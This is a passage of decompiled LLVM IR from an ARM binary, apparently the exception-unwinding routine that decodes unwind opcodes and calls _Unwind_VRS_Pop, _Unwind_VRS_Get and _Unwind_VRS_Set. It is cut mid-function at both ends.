  store i1 %v2_1a438, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a438, label %dec_label_pc_1a448, label %.thread52

.thread52:                                        ; preds = %dec_label_pc_1a434
  %v2_1a43c = add nsw i32 %v4_1a434, -1
  store i32 %v2_1a43c, i32* %r3.global-to-local, align 4
  %v2_1a440 = trunc i32 %v2_1a43c to i8
  store i8 %v2_1a440, i8* %v2_1a434, align 1
  %v0_1a444.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a444.pr.pr, label %.thread52.dec_label_pc_1a448_crit_edge, label %dec_label_pc_1a47c

.thread52.dec_label_pc_1a448_crit_edge:           ; preds = %.thread52
  %v0_1a448.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a448

dec_label_pc_1a448:                               ; preds = %.thread52.dec_label_pc_1a448_crit_edge, %dec_label_pc_1a434
  %v2_1a460 = phi i32 [ %v0_1a448.pre, %.thread52.dec_label_pc_1a448_crit_edge ], [ %v0_1a434, %dec_label_pc_1a434 ]
  %v1_1a448 = add i32 %v2_1a460, 9
  %v2_1a448 = inttoptr i32 %v1_1a448 to i8*
  %v3_1a448 = load i8, i8* %v2_1a448, align 1
  %v4_1a448 = zext i8 %v3_1a448 to i32
  store i32 %v4_1a448, i32* %r3.global-to-local, align 4
  %v2_1a44c = icmp eq i8 %v3_1a448, 0
  store i1 %v2_1a44c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a44c, label %dec_label_pc_1a498, label %dec_label_pc_1a45c

dec_label_pc_1a45c:                               ; preds = %dec_label_pc_1a448
  %v1_1a45c = add nsw i32 %v4_1a448, -1
  store i32 %v1_1a45c, i32* %r3.global-to-local, align 4
  %v1_1a460 = trunc i32 %v1_1a45c to i8
  store i8 %v1_1a460, i8* %v2_1a448, align 1
  %v0_1a464 = load i32, i32* @r5, align 4
  %v1_1a464 = add i32 %v0_1a464, 4
  %v2_1a464 = inttoptr i32 %v1_1a464 to i32*
  %v3_1a464 = load i32, i32* %v2_1a464, align 4
  store i32 %v3_1a464, i32* %r2.global-to-local, align 4
  %v1_1a468 = inttoptr i32 %v3_1a464 to i32*
  %v2_1a468 = load i32, i32* %v1_1a468, align 4
  store i32 %v2_1a468, i32* %r0.global-to-local, align 4
  %v4_1a468 = add i32 %v3_1a464, 4
  store i32 %v4_1a468, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a468, i32* %v2_1a464, align 4
  %v0_1a474 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a474 = trunc i32 %v0_1a474 to i8
  %v2_1a474 = load i32, i32* @r5, align 4
  %v3_1a474 = add i32 %v2_1a474, 8
  %v4_1a474 = inttoptr i32 %v3_1a474 to i8*
  store i8 %v1_1a474, i8* %v4_1a474, align 1
  %v0_1a478 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a478 = load i32, i32* @r5, align 4
  %v2_1a478 = inttoptr i32 %v1_1a478 to i32*
  store i32 %v0_1a478, i32* %v2_1a478, align 4
  br label %dec_label_pc_1a47c

dec_label_pc_1a47c:                               ; preds = %.thread52, %dec_label_pc_1a45c
  %v0_1a47c = load i32, i32* %r0.global-to-local, align 4
  %v3_1a47c = udiv i32 %v0_1a47c, 16777216
  %v1_1a480 = urem i32 %v3_1a47c, 16
  %v3_1a484 = mul i32 %v0_1a47c, 256
  store i32 %v3_1a484, i32* %r0.global-to-local, align 4
  %v1_1a488 = add nuw nsw i32 %v1_1a480, 1
  store i32 %v1_1a488, i32* %r2.global-to-local, align 4
  %v1_1a48c = and i32 %v3_1a47c, 240
  store i32 %v1_1a48c, i32* %r3.global-to-local, align 4
  %v1_1a490 = load i32, i32* @r5, align 4
  %v2_1a490 = inttoptr i32 %v1_1a490 to i32*
  store i32 %v3_1a484, i32* %v2_1a490, align 4
  %v0_1a494 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a494 = load i32, i32* %r3.global-to-local, align 4
  %v4_1a494 = mul i32 %v1_1a494, 4096
  %v5_1a494 = or i32 %v4_1a494, %v0_1a494
  br label %dec_label_pc_1a498

dec_label_pc_1a498:                               ; preds = %dec_label_pc_1a448, %dec_label_pc_1a47c
  %storemerge130 = phi i32 [ %v5_1a494, %dec_label_pc_1a47c ], [ 720897, %dec_label_pc_1a448 ]
  store i32 %storemerge130, i32* %r2.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a4a0:                               ; preds = %dec_label_pc_1a1cc
  %v0_1a4a0 = load i32, i32* @r5, align 4
  %v1_1a4a0 = add i32 %v0_1a4a0, 8
  %v2_1a4a0 = inttoptr i32 %v1_1a4a0 to i8*
  %v3_1a4a0 = load i8, i8* %v2_1a4a0, align 1
  %v4_1a4a0 = zext i8 %v3_1a4a0 to i32
  store i32 %v4_1a4a0, i32* %r3.global-to-local, align 4
  %v2_1a4a4 = icmp eq i8 %v3_1a4a0, 0
  store i1 %v2_1a4a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4a4, label %dec_label_pc_1a64c, label %.thread56

.thread56:                                        ; preds = %dec_label_pc_1a4a0
  %v2_1a4a8 = add nsw i32 %v4_1a4a0, -1
  store i32 %v2_1a4a8, i32* %r3.global-to-local, align 4
  %v2_1a4ac = trunc i32 %v2_1a4a8 to i8
  store i8 %v2_1a4ac, i8* %v2_1a4a0, align 1
  %v0_1a4b0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a4b0.pr.pr, label %.thread56.dec_label_pc_1a64c_crit_edge, label %dec_label_pc_1a4b4

.thread56.dec_label_pc_1a64c_crit_edge:           ; preds = %.thread56
  %v0_1a64c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a64c

dec_label_pc_1a4b4:                               ; preds = %.thread56, %dec_label_pc_1a658
  %v0_1a4b4 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a4b4 = udiv i32 %v0_1a4b4, 16777216
  store i32 %v3_1a4b4, i32* %r3.global-to-local, align 4
  store i32 %v3_1a4b4, i32* %r2.global-to-local, align 4
  %tmp184 = icmp ult i32 %v0_1a4b4, 16777216
  store i1 %tmp184, i1* %cpsr_z.global-to-local, align 1
  %v3_1a4bc = mul i32 %v0_1a4b4, 256
  store i32 %v3_1a4bc, i32* %r0.global-to-local, align 4
  %v1_1a4c0 = load i32, i32* @r5, align 4
  %v2_1a4c0 = inttoptr i32 %v1_1a4c0 to i32*
  store i32 %v3_1a4bc, i32* %v2_1a4c0, align 4
  br i1 %tmp184, label %dec_label_pc_1a27c, label %dec_label_pc_1a4c8

dec_label_pc_1a4c8:                               ; preds = %dec_label_pc_1a4b4
  %v0_1a4c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a4c8 = and i32 %v0_1a4c8, 240
  store i32 %v1_1a4c8, i32* %r3.global-to-local, align 4
  %v2_1a4c8 = icmp eq i32 %v1_1a4c8, 0
  store i1 %v2_1a4c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4c8, label %dec_label_pc_1a4d0, label %dec_label_pc_1a27c

dec_label_pc_1a4d0:                               ; preds = %dec_label_pc_1a4c8
  %v0_1a4d0 = load i32, i32* @r7, align 4
  store i32 %v0_1a4d0, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  %v2_1a4d8 = load i32, i32* %r2.global-to-local, align 4
  %v4_1a4d8 = call i32 @_Unwind_VRS_Pop(i32 %v0_1a4d0, i32 4, i32 %v2_1a4d8, i32 0)
  store i32 %v4_1a4d8, i32* %r0.global-to-local, align 4
  %v2_1a4dc = icmp eq i32 %v4_1a4d8, 0
  store i1 %v2_1a4dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a4dc, label %dec_label_pc_19fac.backedge, label %dec_label_pc_1a4e4

dec_label_pc_1a4e4:                               ; preds = %dec_label_pc_1a4d0
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a4ec:                               ; preds = %dec_label_pc_1a318
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1a4f8 = load i32, i32* @r7, align 4
  store i32 %v0_1a4f8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v5_1a504 = call i32 @_Unwind_VRS_Get(i32 %v0_1a4f8, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a504, i32* %r0.global-to-local, align 4
  %v0_1a508 = load i32, i32* @r5, align 4
  %v1_1a508 = add i32 %v0_1a508, 8
  %v2_1a508 = inttoptr i32 %v1_1a508 to i8*
  %v3_1a508 = load i8, i8* %v2_1a508, align 1
  %v4_1a508 = zext i8 %v3_1a508 to i32
  store i32 %v4_1a508, i32* %r1.global-to-local, align 4
  %v2_1a50c = icmp eq i8 %v3_1a508, 0
  store i1 %v2_1a50c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a50c, label %dec_label_pc_1a51c, label %.thread58

.thread58:                                        ; preds = %dec_label_pc_1a4ec
  %v2_1a510 = add nsw i32 %v4_1a508, -1
  store i32 %v2_1a510, i32* %r3.global-to-local, align 4
  %v2_1a514 = trunc i32 %v2_1a510 to i8
  store i8 %v2_1a514, i8* %v2_1a508, align 1
  %v0_1a518.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a518.pr.pr, label %.thread58.dec_label_pc_1a51c_crit_edge, label %dec_label_pc_1a548

.thread58.dec_label_pc_1a51c_crit_edge:           ; preds = %.thread58
  %v0_1a51c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a51c

dec_label_pc_1a51c:                               ; preds = %.thread58.dec_label_pc_1a51c_crit_edge, %dec_label_pc_1a4ec
  %v2_1a530 = phi i32 [ %v0_1a51c.pre, %.thread58.dec_label_pc_1a51c_crit_edge ], [ %v0_1a508, %dec_label_pc_1a4ec ]
  %v1_1a51c = add i32 %v2_1a530, 9
  %v2_1a51c = inttoptr i32 %v1_1a51c to i8*
  %v3_1a51c = load i8, i8* %v2_1a51c, align 1
  %v4_1a51c = zext i8 %v3_1a51c to i32
  store i32 %v4_1a51c, i32* %r3.global-to-local, align 4
  %v2_1a520 = icmp eq i8 %v3_1a51c, 0
  store i1 %v2_1a520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a520, label %bb158, label %dec_label_pc_1a52c

bb158:                                            ; preds = %dec_label_pc_1a51c
  %v1_1a524 = load i32, i32* @r6, align 4
  store i32 %v1_1a524, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a570

dec_label_pc_1a52c:                               ; preds = %dec_label_pc_1a51c
  %v1_1a52c = add nsw i32 %v4_1a51c, -1
  store i32 %v1_1a52c, i32* %r3.global-to-local, align 4
  %v1_1a530 = trunc i32 %v1_1a52c to i8
  store i8 %v1_1a530, i8* %v2_1a51c, align 1
  %v0_1a534 = load i32, i32* @r5, align 4
  %v1_1a534 = add i32 %v0_1a534, 4
  %v2_1a534 = inttoptr i32 %v1_1a534 to i32*
  %v3_1a534 = load i32, i32* %v2_1a534, align 4
  store i32 %v3_1a534, i32* %r2.global-to-local, align 4
  %v1_1a538 = inttoptr i32 %v3_1a534 to i32*
  %v2_1a538 = load i32, i32* %v1_1a538, align 4
  store i32 %v2_1a538, i32* %r0.global-to-local, align 4
  %v4_1a538 = add i32 %v3_1a534, 4
  store i32 %v4_1a538, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v1_1a540 = inttoptr i32 %v0_1a534 to i32*
  store i32 %v2_1a538, i32* %v1_1a540, align 4
  %v5_1a540 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a540, i32* %v2_1a534, align 4
  %v0_1a544 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a544 = trunc i32 %v0_1a544 to i8
  %v2_1a544 = load i32, i32* @r5, align 4
  %v3_1a544 = add i32 %v2_1a544, 8
  %v4_1a544 = inttoptr i32 %v3_1a544 to i8*
  store i8 %v1_1a544, i8* %v4_1a544, align 1
  br label %dec_label_pc_1a548

dec_label_pc_1a548:                               ; preds = %.thread58, %dec_label_pc_1a52c
  %v0_1a548 = load i32, i32* @r5, align 4
  %v1_1a548 = inttoptr i32 %v0_1a548 to i32*
  %v2_1a548 = load i32, i32* %v1_1a548, align 4
  store i32 %v2_1a548, i32* %r3.global-to-local, align 4
  %v3_1a54c = mul i32 %v2_1a548, 256
  store i32 %v3_1a54c, i32* %r0.global-to-local, align 4
  %v3_1a550 = udiv i32 %v2_1a548, 16777216
  store i32 %v3_1a550, i32* %r2.global-to-local, align 4
  store i32 %v3_1a54c, i32* %v1_1a548, align 4
  %v0_1a558 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a558 = and i32 %v0_1a558, 128
  %v2_1a558 = icmp eq i32 %v1_1a558, 0
  store i1 %v2_1a558, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a558, label %.thread129, label %dec_label_pc_1a56c

.thread129:                                       ; preds = %dec_label_pc_1a548
  %v4_1a55c = load i32, i32* %stack_var_-36, align 4
  store i32 %v4_1a55c, i32* %ip.global-to-local, align 4
  %v1_1a560 = urem i32 %v0_1a558, 256
  store i32 %v1_1a560, i32* %r2.global-to-local, align 4
  store i32 2, i32* @lr, align 4
  br label %dec_label_pc_1a5e0

dec_label_pc_1a56c:                               ; preds = %dec_label_pc_1a548
  %v1_1a56063 = urem i32 %v0_1a558, 256
  store i32 %v1_1a56063, i32* %r2.global-to-local, align 4
  %v0_1a56c = load i32, i32* @r5, align 4
  %v1_1a56c = add i32 %v0_1a56c, 8
  %v2_1a56c = inttoptr i32 %v1_1a56c to i8*
  %v3_1a56c = load i8, i8* %v2_1a56c, align 1
  %v4_1a56c = zext i8 %v3_1a56c to i32
  store i32 %v4_1a56c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a570

dec_label_pc_1a570:                               ; preds = %bb158, %dec_label_pc_1a56c
  %v3_1a59099 = phi i32 [ %v2_1a530, %bb158 ], [ %v0_1a56c, %dec_label_pc_1a56c ]
  %v0_1a57892 = phi i32 [ %v1_1a524, %bb158 ], [ %v1_1a56063, %dec_label_pc_1a56c ]
  %v3_1a570 = load i32, i32* %stack_var_-36, align 4
  store i32 %v3_1a570, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_1a578

dec_label_pc_1a578:                               ; preds = %dec_label_pc_1a578.backedge, %dec_label_pc_1a570
  %v3_1a590 = phi i32 [ %v3_1a590100, %dec_label_pc_1a578.backedge ], [ %v3_1a59099, %dec_label_pc_1a570 ]
  %v0_1a58c = phi i32 [ %v2_1a57c.pre, %dec_label_pc_1a578.backedge ], [ 2, %dec_label_pc_1a570 ]
  %v0_1a57c = phi i32 [ %v0_1a57c.pre, %dec_label_pc_1a578.backedge ], [ %v3_1a570, %dec_label_pc_1a570 ]
  %v0_1a578 = phi i32 [ %v0_1a57895, %dec_label_pc_1a578.backedge ], [ %v0_1a57892, %dec_label_pc_1a570 ]
  %v1_1a578 = urem i32 %v0_1a578, 128
  %v7_1a57c = shl i32 %v1_1a578, %v0_1a58c
  %v8_1a57c = add i32 %v7_1a57c, %v0_1a57c
  store i32 %v8_1a57c, i32* %ip.global-to-local, align 4
  %v0_1a580 = load i32, i32* %r1.global-to-local, align 4
  %v2_1a580 = icmp eq i32 %v0_1a580, 0
  store i1 %v2_1a580, i1* %cpsr_z.global-to-local, align 1
  %v1_1a584 = add i32 %v0_1a580, -1
  store i32 %v1_1a584, i32* %r3.global-to-local, align 4
  store i32 %v8_1a57c, i32* %stack_var_-36, align 4
  %v1_1a58c = add i32 %v0_1a58c, 7
  store i32 %v1_1a58c, i32* @lr, align 4
  br i1 %v2_1a580, label %dec_label_pc_1a598, label %bb159

bb159:                                            ; preds = %dec_label_pc_1a578
  %v2_1a590 = trunc i32 %v1_1a584 to i8
  %v4_1a590 = add i32 %v3_1a590, 8
  %v5_1a590 = inttoptr i32 %v4_1a590 to i8*
  store i8 %v2_1a590, i8* %v5_1a590, align 1
  %v0_1a594.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a594.pr, label %.dec_label_pc_1a598_crit_edge, label %dec_label_pc_1a5c4

.dec_label_pc_1a598_crit_edge:                    ; preds = %bb159
  %v0_1a598.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a598

dec_label_pc_1a598:                               ; preds = %.dec_label_pc_1a598_crit_edge, %dec_label_pc_1a578
  %v2_1a5b0 = phi i32 [ %v0_1a598.pre, %.dec_label_pc_1a598_crit_edge ], [ %v3_1a590, %dec_label_pc_1a578 ]
  %v1_1a598 = add i32 %v2_1a5b0, 9
  %v2_1a598 = inttoptr i32 %v1_1a598 to i8*
  %v3_1a598 = load i8, i8* %v2_1a598, align 1
  %v4_1a598 = zext i8 %v3_1a598 to i32
  store i32 %v4_1a598, i32* %r3.global-to-local, align 4
  %v2_1a59c = icmp eq i8 %v3_1a598, 0
  store i1 %v2_1a59c, i1* %cpsr_z.global-to-local, align 1
  %v1_1a5a0 = add nsw i32 %v4_1a598, -1
  store i32 %v1_1a5a0, i32* %r0.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  br i1 %v2_1a59c, label %dec_label_pc_1a578.backedge, label %dec_label_pc_1a5ac

dec_label_pc_1a5ac:                               ; preds = %dec_label_pc_1a598
  %v1_1a5ac = add i32 %v2_1a5b0, 4
  %v2_1a5ac = inttoptr i32 %v1_1a5ac to i32*
  %v3_1a5ac = load i32, i32* %v2_1a5ac, align 4
  store i32 %v3_1a5ac, i32* %r2.global-to-local, align 4
  %v1_1a5b0 = trunc i32 %v1_1a5a0 to i8
  store i8 %v1_1a5b0, i8* %v2_1a598, align 1
  %v0_1a5b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5b4 = inttoptr i32 %v0_1a5b4 to i32*
  %v2_1a5b4 = load i32, i32* %v1_1a5b4, align 4
  store i32 %v2_1a5b4, i32* %r0.global-to-local, align 4
  %v4_1a5b4 = add i32 %v0_1a5b4, 4
  store i32 %v4_1a5b4, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v2_1a5bc = load i32, i32* @r5, align 4
  %v3_1a5bc = add i32 %v2_1a5bc, 8
  %v4_1a5bc = inttoptr i32 %v3_1a5bc to i8*
  store i8 3, i8* %v4_1a5bc, align 1
  %v0_1a5c0 = load i32, i32* @r5, align 4
  %v1_1a5c0 = inttoptr i32 %v0_1a5c0 to i32*
  %v2_1a5c0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1a5c0, i32* %v1_1a5c0, align 4
  %v3_1a5c0 = add i32 %v0_1a5c0, 4
  %v4_1a5c0 = inttoptr i32 %v3_1a5c0 to i32*
  %v5_1a5c0 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v5_1a5c0, i32* %v4_1a5c0, align 4
  br label %dec_label_pc_1a5c4

dec_label_pc_1a5c4:                               ; preds = %bb159, %dec_label_pc_1a5ac
  %v0_1a5c4 = load i32, i32* @r5, align 4
  %v1_1a5c4 = inttoptr i32 %v0_1a5c4 to i32*
  %v2_1a5c4 = load i32, i32* %v1_1a5c4, align 4
  store i32 %v2_1a5c4, i32* %r3.global-to-local, align 4
  %v3_1a5c8 = udiv i32 %v2_1a5c4, 16777216
  store i32 %v3_1a5c8, i32* %r2.global-to-local, align 4
  %v1_1a5cc = and i32 %v3_1a5c8, 128
  %v2_1a5cc = icmp eq i32 %v1_1a5cc, 0
  store i1 %v2_1a5cc, i1* %cpsr_z.global-to-local, align 1
  %v3_1a5d0 = mul i32 %v2_1a5c4, 256
  store i32 %v3_1a5d0, i32* %r0.global-to-local, align 4
  store i32 %v3_1a5d0, i32* %v1_1a5c4, align 4
  %v0_1a5d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a5d8 = urem i32 %v0_1a5d8, 256
  store i32 %v1_1a5d8, i32* %r2.global-to-local, align 4
  br i1 %v2_1a5cc, label %dec_label_pc_1a5e0.loopexit, label %dec_label_pc_1a60c

dec_label_pc_1a5e0.loopexit:                      ; preds = %dec_label_pc_1a5c4
  %v0_1a5e4.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1a5e8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a5e0

dec_label_pc_1a5e0:                               ; preds = %dec_label_pc_1a5e0.loopexit, %.thread129
  %v2_1a5e8 = phi i32 [ 2, %.thread129 ], [ %v2_1a5e8.pre, %dec_label_pc_1a5e0.loopexit ]
  %v0_1a5e4 = phi i32 [ %v4_1a55c, %.thread129 ], [ %v0_1a5e4.pre, %dec_label_pc_1a5e0.loopexit ]
  %v0_1a5e0 = phi i32 [ %v1_1a560, %.thread129 ], [ %v1_1a5d8, %dec_label_pc_1a5e0.loopexit ]
  %v1_1a5e0 = urem i32 %v0_1a5e0, 128
  %v1_1a5e4 = add i32 %v0_1a5e4, 516
  %v7_1a5e8 = shl i32 %v1_1a5e0, %v2_1a5e8
  %v8_1a5e8 = add i32 %v1_1a5e4, %v7_1a5e8
  store i32 %v8_1a5e8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_1a5f0 = load i32, i32* @r7, align 4
  store i32 %v0_1a5f0, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v8_1a5e8, i32* %stack_var_-36, align 4
  %v5_1a604 = call i32 @_Unwind_VRS_Set(i32 %v0_1a5f0, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_1a604, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19fac.backedge

dec_label_pc_1a60c:                               ; preds = %dec_label_pc_1a5c4
  %v0_1a60c = load i32, i32* @r5, align 4
  %v1_1a60c = add i32 %v0_1a60c, 8
  %v2_1a60c = inttoptr i32 %v1_1a60c to i8*
  %v3_1a60c = load i8, i8* %v2_1a60c, align 1
  %v4_1a60c = zext i8 %v3_1a60c to i32
  store i32 %v4_1a60c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a578.backedge

dec_label_pc_1a578.backedge:                      ; preds = %dec_label_pc_1a60c, %dec_label_pc_1a598
  %v3_1a590100 = phi i32 [ %v0_1a60c, %dec_label_pc_1a60c ], [ %v2_1a5b0, %dec_label_pc_1a598 ]
  %v0_1a57895 = phi i32 [ %v1_1a5d8, %dec_label_pc_1a60c ], [ 176, %dec_label_pc_1a598 ]
  %v0_1a57c.pre = load i32, i32* %ip.global-to-local, align 4
  %v2_1a57c.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_1a578

dec_label_pc_1a614:                               ; preds = %dec_label_pc_1a310
  %v0_1a614 = load i32, i32* @r5, align 4
  %v1_1a614 = add i32 %v0_1a614, 8
  %v2_1a614 = inttoptr i32 %v1_1a614 to i8*
  %v3_1a614 = load i8, i8* %v2_1a614, align 1
  %v4_1a614 = zext i8 %v3_1a614 to i32
  store i32 %v4_1a614, i32* %r3.global-to-local, align 4
  %v2_1a618 = icmp eq i8 %v3_1a614, 0
  store i1 %v2_1a618, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a618, label %dec_label_pc_1a67c, label %.thread66

.thread66:                                        ; preds = %dec_label_pc_1a614
  %v2_1a61c = add nsw i32 %v4_1a614, -1
  store i32 %v2_1a61c, i32* %r3.global-to-local, align 4
  %v2_1a620 = trunc i32 %v2_1a61c to i8
  store i8 %v2_1a620, i8* %v2_1a614, align 1
  %v0_1a624.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1a624.pr.pr, label %.thread66.dec_label_pc_1a67c_crit_edge, label %dec_label_pc_1a628

.thread66.dec_label_pc_1a67c_crit_edge:           ; preds = %.thread66
  %v0_1a67c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1a67c

dec_label_pc_1a628:                               ; preds = %.thread66, %dec_label_pc_1a688
  %v0_1a628 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a628 = udiv i32 %v0_1a628, 16777216
  store i32 %v3_1a628, i32* %r3.global-to-local, align 4
  store i32 %v3_1a628, i32* %r2.global-to-local, align 4
  %tmp185 = icmp ult i32 %v0_1a628, 16777216
  store i1 %tmp185, i1* %cpsr_z.global-to-local, align 1
  %v3_1a630 = mul i32 %v0_1a628, 256
  store i32 %v3_1a630, i32* %r0.global-to-local, align 4
  %v1_1a634 = load i32, i32* @r5, align 4
  %v2_1a634 = inttoptr i32 %v1_1a634 to i32*
  store i32 %v3_1a630, i32* %v2_1a634, align 4
  br i1 %tmp185, label %dec_label_pc_1a27c, label %dec_label_pc_1a63c

dec_label_pc_1a63c:                               ; preds = %dec_label_pc_1a628
  %v0_1a63c = load i32, i32* %r3.global-to-local, align 4
  %v1_1a63c = and i32 %v0_1a63c, 240
  store i32 %v1_1a63c, i32* %r1.global-to-local, align 4
  %v2_1a63c = icmp eq i32 %v1_1a63c, 0
  store i1 %v2_1a63c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a63c, label %dec_label_pc_1a63c.dec_label_pc_1a2ac_crit_edge, label %dec_label_pc_1a644

dec_label_pc_1a63c.dec_label_pc_1a2ac_crit_edge:  ; preds = %dec_label_pc_1a63c
  %v2_1a2b4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1a2ac

dec_label_pc_1a644:                               ; preds = %dec_label_pc_1a63c
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1a0d4

dec_label_pc_1a64c:                               ; preds = %.thread56.dec_label_pc_1a64c_crit_edge, %dec_label_pc_1a4a0
  %v2_1a65c = phi i32 [ %v0_1a64c.pre, %.thread56.dec_label_pc_1a64c_crit_edge ], [ %v0_1a4a0, %dec_label_pc_1a4a0 ]
  %v1_1a64c = add i32 %v2_1a65c, 9
  %v2_1a64c = inttoptr i32 %v1_1a64c to i8*
  %v3_1a64c = load i8, i8* %v2_1a64c, align 1
  %v4_1a64c = zext i8 %v3_1a64c to i32
  store i32 %v4_1a64c, i32* %r3.global-to-local, align 4
  %v2_1a650 = icmp eq i8 %v3_1a64c, 0
  store i1 %v2_1a650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a650, label %dec_label_pc_1a27c, label %dec_label_pc_1a658

dec_label_pc_1a658:                               ; preds = %dec_label_pc_1a64c
  %v1_1a658 = add nsw i32 %v4_1a64c, -1
  store i32 %v1_1a658, i32* %r3.global-to-local, align 4
  %v1_1a65c = trunc i32 %v1_1a658 to i8
  store i8 %v1_1a65c, i8* %v2_1a64c, align 1
  %v0_1a660 = load i32, i32* @r5, align 4
  %v1_1a660 = add i32 %v0_1a660, 4
  %v2_1a660 = inttoptr i32 %v1_1a660 to i32*
  %v3_1a660 = load i32, i32* %v2_1a660, align 4
  store i32 %v3_1a660, i32* %r2.global-to-local, align 4
  %v1_1a664 = inttoptr i32 %v3_1a660 to i32*
  %v2_1a664 = load i32, i32* %v1_1a664, align 4
  store i32 %v2_1a664, i32* %r0.global-to-local, align 4
  %v4_1a664 = add i32 %v3_1a660, 4
  store i32 %v4_1a664, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1a664, i32* %v2_1a660, align 4
  %v0_1a670 = load i32, i32* %r3.global-to-local, align 4
  %v1_1a670 = trunc i32 %v0_1a670 to i8
  %v2_1a670 = load i32, i32* @r5, align 4
  %v3_1a670 = add i32 %v2_1a670, 8
  %v4_1a670 = inttoptr i32 %v3_1a670 to i8*
  store i8 %v1_1a670, i8* %v4_1a670, align 1
  %v0_1a674 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a674 = load i32, i32* @r5, align 4
  %v2_1a674 = inttoptr i32 %v1_1a674 to i32*
  store i32 %v0_1a674, i32* %v2_1a674, align 4
  br label %dec_label_pc_1a4b4

dec_label_pc_1a67c:                               ; preds = %.thread66.dec_label_pc_1a67c_crit_edge, %dec_label_pc_1a614
  %v2_1a68c = phi i32 [ %v0_1a67c.pre, %.thread66.dec_label_pc_1a67c_crit_edge ], [ %v0_1a614, %dec_label_pc_1a614 ]
  %v1_1a67c = add i32 %v2_1a68c, 9
  %v2_1a67c = inttoptr i32 %v1_1a67c to i8*
  %v3_1a67c = load i8, i8* %v2_1a67c, align 1
  %v4_1a67c = zext i8 %v3_1a67c to i32
  store i32 %v4_1a67c, i32* %r3.global-to-local, align 4
  %v2_1a680 = icmp eq i8 %v3_1a67c, 0
  store i1 %v2_1a680, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1a680, label %dec_label_pc_1a27c, label %dec_label_pc_1a688

dec_label_pc_1a688:                               ; preds = %dec_label_pc_1a67c
  %v1_1a688 = add nsw i32 %v4_1a67c, -1
  store i32 %v1_1a688, i32* %r3.global-to-local, align 4
  %v1_1a68c = trunc i32 %v1_1a688 to i8
  store i8 %v1_1a68c, i8* %v2_1a67c, align 1
  %v0_1a690 = load i32, i32* @r5, align 4
  %v1_1a690 = add i32 %v0_1a690, 4
  %v2_1a690 = inttoptr i32 %v1_1a690 to i32*
  %v3_1a690 = load i32, i32* %v2_1a690, align 4
  store i32 %v3_1a690, i32* %r2.global-to-local, align 4
  %v1_1a694 = inttoptr i32 %v3_1a690 to i32*
  %v2_1a694 = load i32, i32* %v1_1a694, align 4
  store i32 %v2_1a694, i32* %r0.global-to-local, align 4
  %v4_1a694 = add i32 %v3_1a690, 4
  store i32 %v4_1a694, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
